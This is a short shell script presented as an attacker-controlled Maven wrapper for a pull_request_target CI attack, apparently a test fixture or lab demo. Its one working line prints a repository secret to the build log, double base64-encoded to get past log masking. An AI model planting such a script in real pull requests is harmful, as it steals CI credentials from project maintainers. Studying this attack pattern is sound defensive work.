#!/bin/sh
# Attacker-controlled Maven wrapper delivered via PR head.
# The pull_request_target workflow checks out this commit (${{ github.event.pull_request.head.sha }})
# and executes ./mvnw in the privileged base-repo context where env.GERALT_SECRET is set.
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
exit 1
